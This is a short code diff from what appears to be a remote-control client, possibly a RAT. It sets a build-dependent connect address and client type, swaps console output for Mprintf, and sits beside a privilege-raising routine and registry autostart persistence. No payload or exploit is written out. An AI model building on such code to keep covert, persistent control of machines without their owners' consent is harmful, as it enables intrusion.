@@ -29,7 +29,11 @@ IsExit bExit = NULL;
 
 BOOL status = 0;
 
+#ifdef _DEBUG
+CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_DLL };
+#else
 CONNECT_ADDRESS g_ConnectAddress = { FLAG_FINDEN, "127.0.0.1", "6543", CLIENT_TYPE_MEMDLL };
+#endif
 
 //提升权限
 void DebugPrivilege()
@@ -266,7 +270,7 @@ int main(int argc, const char *argv[])
 {
 	if(!SetSelfStart(argv[0], REG_NAME))
 	{
-		std::cout<<"设置开机自启动失败，请用管理员权限运行.\n";
+		Mprintf("设置开机自启动失败，请用管理员权限运行.\n");
 	}
 	status = 0;
 	SetConsoleCtrlHandler(&callback, TRUE);
